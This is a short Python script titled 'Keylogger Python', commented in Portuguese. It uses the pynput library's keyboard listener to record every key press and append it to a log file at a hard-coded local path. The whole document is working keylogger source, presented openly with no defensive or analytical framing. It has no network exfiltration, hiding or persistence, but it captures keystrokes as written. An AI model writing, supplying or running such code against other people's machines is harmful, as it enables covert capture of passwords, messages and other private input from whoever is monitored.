####################################################################
#                      Keylogger Python                            #
####################################################################

#importando a biblioteca pynput, importar o método Listener do teclado
from pynput.keyboard import Listener

#Localização onde será salvo o arquivo de log
logFile = "/home/welquer/Documentos/script/Python/log.txt"

#Função para receber tecla pressionada
def writeLog(key):
    #Convertendo a tecla pressionada p/ string
    keydata = str(key)

    #Arquivo de log
    with open(logFile, "a") as f:
        f.write(keydata)

#Escutando o evento on_press
#no momento que o evento on_press ocorrer, chamar a função writeLog acima
with Listener(on_press=writeLog) as l:
    l.join()